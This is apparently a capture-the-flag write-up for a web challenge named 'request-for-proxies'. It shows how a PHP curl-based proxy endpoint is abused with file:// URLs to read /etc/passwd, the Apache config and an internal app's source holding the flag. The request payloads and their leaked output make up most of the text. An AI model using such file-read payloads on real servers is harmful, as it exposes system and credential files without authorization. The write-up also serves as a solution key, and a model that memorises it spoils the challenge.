I saw an error log when I send the null byte
```
http://request-for-proxies.ch4.btsctf.pl/?address=%00

Fatal error: Uncaught ValueError: curl_setopt(): cURL option must not contain any null bytes in /app/main_webapp/index.php:8 Stack trace: #0 /app/main_webapp/index.php(8): curl_setopt(Object(CurlHandle), 10002, '\x00') #1 {main} thrown in /app/main_webapp/index.php on line 8
```

`curl_setopt` has file lookup vulnerability with using file protocol
```
http://request-for-proxies.ch4.btsctf.pl/?address=file:///etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

`/etc/apache2/sites-enabled/000-default.conf` this file is necessary for apache and it shows all directory of apache related directories
```
http://request-for-proxies.ch4.btsctf.pl/?address=file:///etc/apache2/sites-enabled/000-default.conf

<VirtualHost *:80>
  DocumentRoot  /app/main_webapp
  <Directory "/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Require all granted
  </Directory>
</VirtualHost>

Listen 127.0.0.1:69
<VirtualHost *:69>
  DocumentRoot  /app/flag_webapp
  <Directory "/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Require all granted
  </Directory>
</VirtualHost>
```

`/app/flag_webapp` is really suspicious.
```
view-source:http://request-for-proxies.ch4.btsctf.pl/?address=file:///app/flag_webapp/index.php

<?php
	$flag = "BtS-CTF{my_pr0x1eS_4re_y0Urs_nOw}";
	echo $flag;
?>
```
